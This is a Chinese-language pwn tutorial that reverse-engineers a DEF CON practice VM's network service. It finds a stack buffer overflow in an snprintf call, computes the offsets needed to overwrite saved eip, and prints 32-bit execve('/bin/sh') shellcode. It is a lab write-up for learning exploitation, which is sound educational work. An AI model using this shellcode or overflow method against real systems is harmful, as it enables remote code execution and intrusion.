
# [原创]Pwn学习笔记：Defcon靶机实战演练

## 0x01 前言

DEFCON (也写做 DEF CON, Defcon, or DC) 是全球最大的计算机安全会议之一，自1993年6月起，每年在美国内华达州的拉斯维加斯举办。 DEFCON的与会者主要有计算机安全领域的专家、记者、律师、政府雇员、安全研究员、学生和黑客等对安全领域有兴趣的成员，涉及的领域主要有软件安全、计算机架构、无线电窃听、硬件修改和其他容易受到攻击的信息领域。会议除了有对前沿技术的分享外，还有多种实践项目，如Wargames，最远距离 Wi-Fi 创建比赛，和计算机冷却系统比赛等等。

这个靶机是以前玩过的，是有一年defcon比赛的靶机，拿过来玩了一下，之后我也会发一下以前玩过的好的靶机。

![](upload/attach/201905/823237_3CXMHGMDYVY4QNA.png)

## 0x02 环境配置

靶机下载地址：<mark class="encrypted">624K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2$3N6h3I4F1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6@1M7Y4W2Q4x3V1k6V1k6h3k6U0L8$3&6Q4x3X3c8U0N6r3k6Q4x3X3b7H3x3e0m8Q4x3V1x3I4y4U0m8Q4x3V1j5`.</mark>

我使用的是VMware，导入ova文件，NAT方式连接后靶机自动获取IP

攻击机IP：192.168.2.129

靶机IP：192.168.2.167

![](upload/attach/201905/823237_47VMPNDWQ2SWTWF.png)

在kali输入：

```
nc defcon.local 9999
```

如果连接正确，会在终端看到如下内容：

```
Hans Brix? Oh no! Oh, herro. Great to see you again, Hans!
```

终端在等待输入，我们输入一些信息，比如电影中的这段话：

```
Mr. Il, I was supposed to be allowed to inspect your palace today and your guards won't let me into certain areas.
```

终端会回答我们的输入：

```
Hans Brix says: "Mr. Il, I was supposed to be allowed to inspect your palace today and your guards won't let me into certain areas.
```

通过这种方法检查连接正确，网络配置完成后进入正题。

## 0x03 逆向

从github下载要使用的二进制文件，并进行反汇编，用到的工具是Binary Ninja，你也可以用自己擅长的工具

打开之前先看一下这个文件：

```
kimjong: ELF 32-bit LSB executable, Intel 80386, version 1 (FreeBSD), dynamically linked (uses shared libs), stripped
```

文件要在x86处理器上运行，是ELF，不会提供我们源代码中变量名称和原始函数的任何信息，需要一点x86汇编基础

## 0x04 入口点

当我们用Binary Ninja打开可执行文件时，反汇编程序会找到并显示程序的入口点：

![图片描述](upload/attach/201905/823237_DP2RCW5SFZSR8PJ.png)

入口点-`start`是编译器将代码从`main`函数开始运行的地方，这个文件只需要在下面找到`call -start`

![图片描述](upload/attach/201905/823237_R6XB3T73RSWH3AC.png)

双击此函数`sub_8048a24`是由Binary Ninja 标记的，因为调试符号没有告诉我们真实变量信息，会显示`main`函数：

![图片描述](upload/attach/201905/823237_4EGBRZ8G6WCWJMS.png)

前几行和后几行代码设置了函数的堆栈框架，不需要关注，重点关心下面三个函数调用：

```
08048a31  680f270000        push 0x270f                     // "9999" in decimal - our port number!
08048a36  e88d010000        call sub_8048bc8                // call function 1
08048a3b  89c3              mov ebx, eax                    // move the return value to ebx
08048a3d  c70424968f0408    mov dword [esp {var_30}], data_8048f96  {"kimjong"}  // move pointer to "kimjong" onto stack
08048a44  e83b030000        call sub_8048d84                // call function 2
08048a49  83c408            add esp, 0x8                    // make room for 2 DWORDs on the stack
08048a4c  68b4890408        push 0x80489b4                  // push function address onto stack
08048a51  53                push ebx                        // push function 1 value onto stack
08048a52  e8bd020000        call sub_8048d14                // call function 3
```

## 0x05 分析程序

我们所关心的实际上是在`0x08048A4C`处压入堆栈的函数地址，这是`sub_8048d14`函数的一个参数，查看该函数发现该函数的子进程`fork`将调用地址：`0x080489B4`。在Binary Ninja中，我们可以点击“p”键来告诉它这个地址是一个函数：

![图片描述](upload/attach/201905/823237_CDPF9996QP9PM8V.png)

上面就是连接处理程序，这是我们真正要关心的，当我们使用`netcat`连接到服务时，它会在后台运行，该功能用于处理我们的网络连接，只有3个 基本函数块，接下来我们将一块一块地进行分析

第一块：

```
080489b4  55            push ebp                    // function prologue
080489b5  89e5          mov ebp, esp {var_4}
080489b7  56            push esi
080489b8  53            push ebx
080489b9  81ec04020000  sub esp, 0x204              // 0x204 bytes for local variables
080489bf  8b7508        mov esi, dword [ebp+0x8 {arg_4}]  // sub_8048b44(arg_4, message, 0);
080489c2  6a00          push 0x0
080489c4  68448f0408    push 0x8048f44  {"Hans Brix? Oh no! Oh, herro. Great to see you again, Hans! "}
080489c9  56            push esi
080489ca  e875010000    call sub_8048b44
080489cf  83c410        add esp, 0x10               // clean up the stack
080489d2  baffffffff    mov edx, 0xffffffff         // go to 0x8048a18 if return was -1
080489d7  83f8ff        cmp eax, 0xffffffff
080489da  743c          je 0x8048a18
```

在开头，我们可以看到设置堆栈帧的函数起始点，接下来，我们可以看到程序从堆栈指针（`esp`）中减去`0x204` ，这有效地为堆栈上的`0x204`字节腾出空间用作局部变量。

然后，看到有一个`call sub_8048b44`， x86上FreeBSD 的调用约定`push`是以相反的顺序将所有函数参数传递到堆栈上，这意味着第一个参数中的`call`在`push`之前。

我已经对接下来的4条指令`sub_8048b44(arg_4, message, 0);`进行了反汇编，最后一个`push`在`0x080489C9`编辑堆栈中，`esi`包含了Binary Ninja `arg_4`在`0x080489BF` 标记的内容，这实际上是我们回调的第一个函数的值， `main`作为参数传递给了这个函数。

在调用这个函数之后，我们将调整堆栈指针返回到它应该在的位置并有条件地跳转到另一个地址。地址`0x08048A18`引用第三个函数块，它从函数中很简单地返回（在使用函数`epilogue`清除我们之前做的堆栈帧之后）：

```
08048a18  89d0          mov eax, edx                // return -1 placed in edx at 0x080489CF
08048a1a  8d65f8        lea, esp, [ebp-0x8]
08048a1d  5b            pop ebx
08048a1e  5e            pop esi
08048a1f  c9            leave
08048a20  c3            retn
```

这意味着，如果`sub_8048b44`返回-1（表示发生错误），我们将跳过第二个函数块中的所有逻辑（如Binary Ninja中的箭头所示），这是一个`if`声明在汇编中的样子。

这就是第一个和第三个函数块，第二块更有意思：

```
080489dc  6a00          push 0x0                    // recv(arg_4, var_20c, 0x100, 0);
080489de  6800010000    push 0x100
080489e3  8d9df8fdffff  lea ebx, [ebp-0x208] {var_20c}
080489e9  53            push ebx
080489ea  56            push esi
080489eb  e850fdffff    call recv
080489f0  53            push ebx                    // snprintf(var_10c, 0x12c, format, var_20c);
080489f1  68808f0408    push 0x8048f80  {"Hans Brix says: "%s"\n"}
080489f6  682c010000    push 0x12c
08048a01  53            push ebx
08048a02  e859fdffff    call snprintf
08048a07  83c41c        add esp, 0x1c               // clean up the stack
08048a0a  6a00          push 0x0                    // sub_8048b44(arg_4, var_10c, 0);
08048a0c  53            push ebx
08048a0d  56            push esi
08048a0e  e831010000    call sub_8048b44
08048a13  ba00000000    mov edx, 0x0                // return a 0 to indicate we executed successfully
```

在这里，我们将进行3个函数调用

第一个将从网络接收（`recv`）到`0x100`字节`var_20c` （Binary Ninja的名字`ebp-0x208`，这是一个位置在堆栈上的`0x208`字节）。这是程序获得我们输入的地方！

第二个函数调用需要我们的输入并用`snprintf`它来进行不同的格式化，它会将这个新格式化的字符串保存到`0x12C`字节`var_10c`（Binary Ninja的名字为 `ebp-0x108`，它是堆栈中`0x108`字节的位置），这就是程序建立输出的地方。

第三个函数调用将使用此输出字符串并`sub_8048b44`再次使用它通过网络发送出去，在此之后，我们转到第三个基本块（如上所示）并从函数返回。

## 0x06 漏洞

我们已经分析了程序的所有代码，现在我们来寻找漏洞，先看一下这个堆栈：

`ebp-0x208` -> `var_20c` (our input buffer)
`ebp-0x108` -> `var_10c` (our output buffer)
`ebp-0x8` -> ??? (saved value of `ebx` from the calling function)
`ebp-0x4` -> ??? (saved value of `esi` from the calling function)
`ebp` -> `var_4` (the saved stack address for the calling function's stack frame)
`ebp+0x4` -> ??? (saved value of `eip`, the location we will return to when this function is done)
`ebp+0x8` -> `arg_4` (our socket descriptor)

我们的程序中有两个字符串缓冲区：`var_20c`和`var_10c`，这是输入点，它的长度是`0x100`（256）字节，在`0x080489EB`，我们`recv`最多可以将`0x100`字节存入这个内存位置。

一旦我们有了输入点，我们就可以`snprintf`将字符串转换成特定的格式，我们采用这个新字符串的`0x12C`（300）字节并将它们存储到`var_10c`的输出缓冲区中，这里的问题是我们没有`0x12C`字节的空间 ， 我们只有`0x100`。任何额外的字节都会覆盖掉堆栈下方的其他值。这并不是函数功能所期望的，这样就出现了一个缓冲区溢出漏洞。

## 0x07 漏洞分析

那么，我们如何利用这个漏洞来控制这个程序呢？在x86上最基本的方法是接管`eip`指令指针，这是处理器将执行的下一条指令的地址，如果我们能够控制这个值，我们可以影响下一个程序的执行位置。

为此，我们需要`eip`用输入数据覆盖堆栈中保存的值。为了达到这个目的，我们需要：

来自格式字符串的17个字节
239个字节发送到缓冲区的末端
4个字节来保存`clobber ebx`
4个字节来保存`clobber esi`
4个字节来保存`clobber ebp`
4个字节来保存`clobber eip`

上面的内容加起来是255个字节，如果我们向服务发送255个“A”字符，它将会试图返回地址`0x41414141`（“A”的ASCII值），但是我们不希望程序崩溃 -我们的目的是拿到flag！所以，我们需要将程序指向有意义的地方。

这就是漏洞利用最难的地方了，我们要做的是将指针指向我们的输入，当我们这样做时，程序会相信我们的输入实际上是编译代码 ，就像其他可执行文件一样。因此，我们可以提供符合我们需要的新代码——shellcode

## 0x08 shellcode

当我们通过我们的输入向可执行文件提供新代码时，这些代码就是“shellcode”，Shellcode实际上只是我们自己编写的程序包，而不是编译器的输出结果，这里有一段shellcode可以让我们在远程系统上运行一个shell：

```
[bits 32]
_start:
  xor eax, eax
  push eax
  push 0x68732f2f     ; "//bin/sh"
  push 0x6e69622f
  mov ebx, esp
  push eax
  push esp
  push ebx
  mov al, 0x3b
  push eax
  int 0x80            ; execve("/bin/sh", &"/bin/sh", NULL);
```

这个`shellcode`只是一个`execve` 系统调用，系统调用是对内核的直接请求，而不是对系统库或函数的调用，也有一个独立的调用约定 ，这就是我们上面所设置的，具体来说，我们调用`AUE_EXECVE` 上的`0x3B`（59）系统调用
